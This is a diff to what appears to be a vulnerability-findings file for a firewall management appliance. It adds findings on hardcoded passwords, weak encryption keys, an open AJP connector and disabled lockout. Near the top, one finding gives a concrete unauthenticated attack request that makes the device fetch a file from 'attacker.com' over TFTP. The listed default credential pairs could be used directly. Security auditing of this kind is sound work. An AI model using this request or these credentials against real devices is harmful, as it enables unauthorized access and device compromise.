@@ -144,7 +144,7 @@ FMC-F15: PJB Handler On-Box Auth Bypass — Unauthenticated Arbitrary Function D
   SF/Mojo/Handlers/PjbHandler.pm + SF/UI/PJB.pm — isAuthorized():
   When isNGFWOnbox() == 1 (hardware FMC, /etc/sf/onbox.run exists, Aquila-class device):
     - PjbHandler: session auth SKIPPED entirely
-    - isAuthorized: ALL permission checks bypassed; returns \&{$function} for any registered function
+    - isAuthorized: ALL permission checks bypassed; returns &{$function} for any registered function
   Attack: POST /pjb.cgi function=SF::UI::PJB::Health::AdvancedTroubleshooting::executeAsaCli
           parameters=["<deviceId>","copy tftp://attacker.com/x disk0:/x"]
   No credentials required. CLI whitelist: copy, delete, no, cluster, show, ping, traceroute, capture, clear, packet-tracer.
@@ -233,6 +233,17 @@ FMC-F26: MongoDB Unauthenticated — Lamplighter Threat Intelligence Database [M
   Any local process connects to 127.0.0.1:27017 and reads/writes all TID data.
 
 FMC-F27: Redis Unauthenticated — Lamplighter Threat Intelligence Cache [MEDIUM]
+FMC-F28: RabbitMQ definitions.json — Six Hardcoded Default Passwords Including Administrator [CRITICAL]
+FMC-F29: MICE Legacy Port 1741 — Plain HTTP, SSLEngine Off, All Interfaces [CRITICAL]
+FMC-F30: Tomcat AJP Connector secretRequired=false — Ghostcat Mitigation Disabled [HIGH]
+FMC-F31: Threat Grid API Key Derived from Network-Observable MAC Address [HIGH]
+FMC-F32: Five Hardcoded Machine Service Accounts with Fixed Passwords [HIGH]
+FMC-F33: Admin123 Hardcoded as Provisioning Default Across Multiple Subsystems [HIGH]
+FMC-F34: RADIUS Shared Secret Encrypted with Non-Secret APPLIANCE_UUID [HIGH]
+FMC-F35: IPMI BMC Provisioned with Hardcoded admin:Admin123 [HIGH]
+FMC-F36: SMTP Credentials Encrypted with Hardcoded Blowfish Key 'sourcefire' [MEDIUM]
+FMC-F37: RabbitMQ Restricted to Deprecated TLSv1.1 [MEDIUM]
+FMC-F38: pam_faillock deny=0 — OS-Level Account Lockout Disabled [MEDIUM]
   File: opt/lamplighter/etc/redis.conf
   requirepass not set; protected-mode commented out.
   bind 127.0.0.1 (localhost-only).
@@ -248,7 +259,7 @@ import json
 import re
 from typing import Optional
 
-VERSION = "1.4.0"
+VERSION = "1.5.0"
 TARGET = "Cisco FMC 10.0.1-1"
 
 
@@ -1275,6 +1286,193 @@ def full_findings_summary() -> list[dict]:
                 "bind 127.0.0.1:6379; "
                 "caches threat intelligence feed data; "
                 "any local process connects without credentials"
+            ),
+        },
+        {
+            "id": "FMC-F28",
+            "severity": "CRITICAL",
+            "component": "RabbitMQ / Message Broker",
+            "title": "definitions.json — six hardcoded default passwords including administrator",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "etc/rabbitmq/definitions.json",
+            "details": (
+                "Six users with hardcoded passwords loaded at broker startup via load_definitions; "
+                "bonfire-manager:password (tags:administrator), bonfire-app:password (application), "
+                "correlator-app:(empty) (application), FMC:(empty), LL:(empty), ll-local-user:ll-local-user; "
+                "bonfire-manager has full vhost admin rights; "
+                "rabbitmq.config: {loopback_users, []} — management UI reachable from any interface; "
+                "any host-level process can enumerate queues, inject messages, and delete exchanges"
+            ),
+        },
+        {
+            "id": "FMC-F29",
+            "severity": "CRITICAL",
+            "component": "MICE / Apache HTTPd",
+            "title": "MICE legacy port 1741 — plain HTTP, SSLEngine Off, all interfaces",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "etc/httpd/conf.d/ajp-connector.conf",
+            "details": (
+                "Listen 0.0.0.0:1741 and Listen :::1741 — bound to all interfaces; "
+                "VirtualHost _default_:1741 sets SSLEngine Off; "
+                "JkMount /CSCOnm/servlet/* /desktop/DesktopServlet/* /athena/* ajp13 — "
+                "routes Athena/CSM servlet traffic over plain HTTP; "
+                "SSLVerifyClient none on all Location blocks; "
+                "traffic traversing this vhost is cleartext on the wire"
+            ),
+        },
+        {
+            "id": "FMC-F30",
+            "severity": "HIGH",
+            "component": "Tomcat / AJP Connector",
+            "title": "AJP connector secretRequired=false — Ghostcat mitigation disabled",
+            "cve": "CVE-2020-1938",
+            "version": "10.0.1-1",
+            "file": "opt/CSCOpx/MDC/tomcat/conf/server.xml",
+            "details": (
+                'Connector port="9009" protocol="AJP/1.3" address="localhost" secretRequired="false"; '
+                "no shared secret configured on the AJP/1.3 channel; "
+                "equivalent configuration class to CVE-2020-1938 (Ghostcat); "
+                "attacker with access to localhost:9009 can read arbitrary webapp files "
+                "and achieve unauthenticated RCE if file upload is available anywhere in the application"
+            ),
+        },
+        {
+            "id": "FMC-F31",
+            "severity": "HIGH",
+            "component": "Threat Grid / API Key Derivation",
+            "title": "Threat Grid API key derived from network-observable MAC address",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/lib/perl/5.34.3/SF/Files/Analysis.pm",
+            "details": (
+                'Analysis.pm:1869: $apikey = sprintf("%012s%02X%02X", uc($mac), $model_number, ord($model_id)); '
+                "key is a deterministic function of the management interface MAC (network-observable), "
+                "model number (disclosed in SNMP/UI), and single-byte model ID; "
+                "total entropy: MAC (47 bits observed) + model (~8 bits) + model_id (~8 bits); "
+                "attacker who observes management MAC can pre-compute the API key without authentication"
+            ),
+        },
+        {
+            "id": "FMC-F32",
+            "severity": "HIGH",
+            "component": "Auth / Machine Service Accounts",
+            "title": "five hardcoded machine service accounts with fixed passwords",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/lib/perl/5.34.3/SF/",
+            "details": (
+                "Hardcoded credential pairs used by internal machine sessions: "
+                "report:snortrules (SF/ReportGen.pm:4605 + 5828, SF::Auth::LoginSystem); "
+                "csm_processes:csmdaemon (SF/CSMAgent.pm:1185, SF::MachineAuth::Login); "
+                "admin:Sourcefire (SF/InitSequence.pm:305, firstboot/init auth path); "
+                "admin:Admin123 (SF/PeerManager/FTDCloudProxy.pm:44, FTD provisioning); "
+                "admin:space (SF/CLI/system.pm:1171, CLI auth); "
+                "all five bypass password-strength enforcement because AUTH_IS_MACHINE path "
+                "skips the strength validator; any of these credentials grants a valid session "
+                "if the underlying DB account exists"
+            ),
+        },
+        {
+            "id": "FMC-F33",
+            "severity": "HIGH",
+            "component": "Auth / Multi-subsystem Default",
+            "title": "Admin123 hardcoded as provisioning default across multiple subsystems",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/lib/perl/5.34.3/SF/PeerManager/FTDCloudProxy.pm",
+            "details": (
+                "FTDCloudProxy.pm:44: my $defaultPassword = 'Admin123'; — used for FTD device provisioning (line 94); "
+                "init_lights_out_mgmt.pl:8: my $ADMIN_PASS = 'Admin123'; — IPMI BMC provisioning; "
+                "SF::Auth.pm:4018: if($pw && ($pw eq 'Admin123')) — explicit check that acknowledges Admin123 "
+                "as a known default requiring rejection, yet the provisioning paths still set it; "
+                "SF::Permission.pm:131: comment notes Admin123 check was intentionally omitted from validation path; "
+                "Admin123 is the provisioning default for FTD device registration and hardware IPMI; "
+                "window between provisioning and first forced-change is the attack surface"
+            ),
+        },
+        {
+            "id": "FMC-F34",
+            "severity": "HIGH",
+            "component": "RADIUS / AuthConfig",
+            "title": "RADIUS shared secret encrypted with non-secret APPLIANCE_UUID",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/lib/perl/5.34.3/SF/UMPD/Plugins/PlatformSettings/AuthConfig.pm",
+            "details": (
+                "AuthConfig.pm:1436: my $appliance_uuid = SF::Util::getApplianceUUID(); "
+                "AuthConfig.pm:1439: my $encrypted = `echo $string | openssl enc -aes-128-cbc -base64 "
+                "-pbkdf2 -pass pass:$appliance_uuid -A`; "
+                "APPLIANCE_UUID is a system identifier (available via UI, SNMP, and /etc/sf/ims.conf); "
+                "using a non-secret identifier as the AES passphrase means anyone who obtains the UUID "
+                "and the ciphertext (world-readable DB row) can recover the RADIUS shared secret; "
+                "second decrypt path at line 1452 uses the same pattern"
+            ),
+        },
+        {
+            "id": "FMC-F35",
+            "severity": "HIGH",
+            "component": "IPMI / BMC Provisioning",
+            "title": "IPMI BMC provisioned with hardcoded admin:Admin123",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "etc/rc.d/init.d/init_lights_out_mgmt.pl",
+            "details": (
+                "init_lights_out_mgmt.pl:7-8: my $ADMIN_USER = 'admin'; my $ADMIN_PASS = 'Admin123'; "
+                "SF::IPMI::user_add($BMC_CHANNEL, { username => $ADMIN_USER, password => $ADMIN_PASS }); "
+                "applies to pre-M8 FMC hardware appliances; "
+                "IPMI channel is configured before any post-boot password rotation; "
+                "admin:Admin123 grants IPMI LAN access (ipmitool, SOL, KVM-over-LAN) "
+                "to any host reachable on the management network; "
+                "IPMI credential is independent of the OS login; changing the OS admin password does not affect it"
+            ),
+        },
+        {
+            "id": "FMC-F36",
+            "severity": "MEDIUM",
+            "component": "SMTP / Email Settings",
+            "title": "SMTP credentials encrypted with hardcoded Blowfish key 'sourcefire'",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/lib/perl/5.34.3/SF/ConfigEmailSettings.pm",
+            "details": (
+                "ConfigEmailSettings.pm:259: return Crypt::CBC->new(-key => 'sourcefire', -cipher => 'Blowfish'); "
+                "same static key encrypts both live (emailCredentials) and test (emailCredentialsTest) SMTP credentials; "
+                "encrypted blobs stored in Vault under userCredentials/emailCredentials path; "
+                "any process that can read the Vault path and knows the static key can decrypt SMTP credentials; "
+                "Blowfish-CBC with a static passphrase provides no effective confidentiality"
+            ),
+        },
+        {
+            "id": "FMC-F37",
+            "severity": "MEDIUM",
+            "component": "RabbitMQ / TLS Configuration",
+            "title": "RabbitMQ restricted to deprecated TLSv1.1",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "etc/rabbitmq/rabbitmq.config",
+            "details": (
+                "rabbitmq.config:14: {versions, ['tlsv1.1']} — ssl_options restrict broker TLS to TLSv1.1 only; "
+                "TLSv1.1 deprecated by RFC 8996 (March 2021) and disabled by default in OpenSSL 3.x; "
+                "connection is susceptible to known TLSv1.1 downgrade and padding oracle attacks; "
+                "all inter-process and cross-host RabbitMQ traffic is limited to deprecated TLS"
+            ),
+        },
+        {
+            "id": "FMC-F38",
+            "severity": "MEDIUM",
+            "component": "PAM / Account Lockout",
+            "title": "pam_faillock deny=0 — OS-level account lockout disabled",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "etc/pam.d/system-auth",
+            "details": (
+                "system-auth:8: auth required pam_faillock.so preauth per_user deny=0 unlock_time=1800; "
+                "system-auth:10: auth required pam_faillock.so authfail per_user deny=0 unlock_time=1800; "
+                "deny=0 disables the lockout counter — no failed-attempt threshold is enforced at the OS PAM layer; "
+                "SSH and console brute-force attacks against any OS account are not rate-limited by PAM; "
+                "pam_faillock module is loaded but provides no protection in this configuration"
             ),
         },
     ]
